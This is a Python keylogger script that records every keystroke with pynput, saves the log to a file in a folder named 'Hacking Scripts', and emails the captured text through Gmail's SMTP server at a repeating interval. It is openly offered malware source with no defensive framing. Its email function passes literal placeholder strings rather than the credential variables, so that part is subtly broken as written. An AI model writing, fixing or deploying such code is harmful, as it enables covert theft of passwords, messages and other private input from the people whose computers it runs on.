import pynput.keyboard
import threading
import smtplib
import tempfile
import os

log ='keylogger started'
email=''  # put your email ID
password='' # put your password 
interval = int(input("enter the time interval"))
class Keylogger():
    def key_press(self,key):
        global log
        try:
            log = log + str(key.char)
        except:
            if key == key.space:
                log = log + " "
            else:
                log  = log + " "+ str(key)+"  "
        #print(log)

    def report(self):
        global log
        global interval
        global email
        global password

        print(log)
        with open('D:\\Hacking Scripts\\keystrokes.txt','w') as file: #it will captures the key strokes in a file 
            file.write(str(log))

        self.send_mail(email,password,log)
        log = ""
        timer = threading.Timer(interval, self.report)
        timer.start()
    
    def send_mail(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login("email","password")
        server.sendmail("email","email",message)
        server.quit()


    def start(self):
        keyboard_listner = pynput.keyboard.Listener(on_press=self.key_press) # it will listen the key strokes
        with keyboard_listner:
            self.report()
            keyboard_listner.join()

key = Keylogger()
key.start()
